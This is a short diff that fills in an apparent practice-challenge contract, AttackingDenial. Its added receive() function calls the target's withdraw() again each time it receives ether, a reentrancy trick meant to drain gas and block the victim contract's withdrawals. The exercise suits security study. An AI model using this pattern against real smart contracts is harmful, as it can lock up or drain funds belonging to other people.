@@ -2,6 +2,10 @@
 pragma solidity ^0.8.9;
 import "./Denial.sol";
 
+interface DenialInterface {
+    function withdraw() external;
+}
+
 contract AttackingDenial {
     address payable public contractAddress;
 
@@ -10,4 +14,8 @@ contract AttackingDenial {
     }
 
     //Code me!
+    receive() external payable {
+        DenialInterface(contractAddress).withdraw();
+    }
+
 }
